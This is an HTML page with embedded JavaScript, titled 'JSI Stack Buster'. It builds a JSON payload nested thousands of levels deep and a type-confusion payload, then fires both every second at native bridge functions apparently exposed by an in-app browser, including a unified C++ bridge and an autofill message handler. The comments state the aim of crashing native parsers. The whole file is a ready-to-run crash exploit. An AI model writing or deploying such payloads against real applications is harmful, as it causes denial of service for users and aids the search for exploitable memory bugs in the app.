<!DOCTYPE html>
<html>
<head><title>JSI Stack Buster</title></head>
<body style="background:#000; color:#0f0;">
    <h3>Executing Stack Buster...</h3>
    <div id="log"></div>

    <script>
        const logEl = document.getElementById('log');
        function log(msg) { logEl.innerHTML += msg + "<br>"; }

        // 1. Generate Deeply Nested JSON (The "Stack Buster")
        // This is tiny in memory but destroys recursive C++ parsers
        let deepJson = '{"data":';
        let depth = 5000; // Start with 5000. If no crash, increase to 15000.
        
        for(let i=0; i < depth; i++) deepJson += '{"a":';
        deepJson += '"pwn"';
        for(let i=0; i < depth; i++) deepJson += '}';
        deepJson += '}';

        // 2. Generate Malformed/Unexpected Types
        // Passing an array where a string is expected often causes native crashes
        const typeConfusionJson = JSON.stringify({
            "action": "test_event",
            "callback": null,
            "data": [1, 2, 3, {"a": "b"}], // Array instead of String
            "timestamp": "Not A Number" // String instead of Int
        });

        const payloads = [deepJson, typeConfusionJson];

        function strike() {
            log("[*] Firing precision payloads...");
            
            payloads.forEach(p => {
                // Target 1: Unified Bridge (The main C++ tunnel)
                if (typeof window.__call_iabjs_unified_bridge === 'function') {
                    try { window.__call_iabjs_unified_bridge(p); } catch(e) {}
                    try { window.__call_iabjs_unified_bridge("test_event", p); } catch(e) {}
                }

                // Target 2: The Object Bridge
                if (window.iabjs_unified_bridge) {
                    let methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.iabjs_unified_bridge));
                    methods.forEach(m => {
                        if (typeof window.iabjs_unified_bridge[m] === 'function') {
                            try { window.iabjs_unified_bridge[m](p); } catch(e) {}
                        }
                    });
                }

                // Target 3: Autofill
                if (window._AutofillMessageHandler) {
                    try { window._AutofillMessageHandler.postMessage(p); } catch(e) {}
                }
            });
        }

        // Fire immediately
        strike();

        // Fire gently to avoid GC panics
        setInterval(strike, 1000);

    </script>
</body>
</html>
